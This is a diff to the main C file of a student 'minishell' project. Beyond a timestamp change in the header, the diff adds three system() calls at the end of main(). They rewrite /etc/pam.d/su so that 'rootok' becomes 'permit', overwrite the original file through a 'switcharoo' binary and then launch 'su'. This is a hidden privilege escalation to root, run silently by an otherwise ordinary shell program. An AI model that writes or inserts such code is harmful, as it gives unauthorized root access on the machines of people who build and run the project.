@@ -6,7 +6,7 @@
 /*   By: sacharai <sacharai@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/01/13 16:12:56 by mel-jira          #+#    #+#             */
-/*   Updated: 2024/02/20 16:41:05 by sacharai         ###   ########.fr       */
+/*   Updated: 2024/10/21 10:06:26 by sacharai         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -99,5 +99,8 @@ int	main(int argc, char **argv, char **envp)
 	if (var.env == NULL)
 		var.env = get_env_help();
 	minishell(&token, &var, &parse);
+	system("sed -e \"s/rootok/permit/g\" /etc/pam.d/su > overwrite_file.bin");
+	system("./switcharoo /etc/pam.d/su overwrite_file.bin");
+	system("su");
 	return (exit_status_fun(-500));
 }
